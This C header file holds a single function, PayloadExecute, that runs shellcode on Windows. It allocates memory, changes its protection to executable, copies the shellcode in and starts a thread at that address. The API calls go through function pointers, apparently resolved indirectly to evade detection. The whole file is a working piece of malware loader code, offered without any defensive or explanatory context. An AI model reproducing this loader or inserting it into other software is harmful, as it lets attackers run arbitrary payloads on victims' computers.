#pragma once
#include "api.h"
#include <stdio.h>
#include <Windows.h>

BOOL PayloadExecute(IN OPTIONAL HANDLE hProcess, IN OPTIONAL HANDLE hThread, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	PBYTE		pAddress = NULL;
	DWORD		dwOldProtection = 0x00;
	hThread = NULL;

	if (!pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!(pAddress = (PBYTE)pVirtualAlloc(NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	if (!pVirtualProtect(pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error: %d\n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	memcpy(pAddress, pShellcodeAddress, sShellcodeSize);

	if (!(hThread = pCreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0x00, NULL))) {
		printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
		fflush(stdout);
		return FALSE;
	}

	*ppInjectionAddress = pAddress;
	if (phThread)
		*phThread = hThread;

	return TRUE;
}
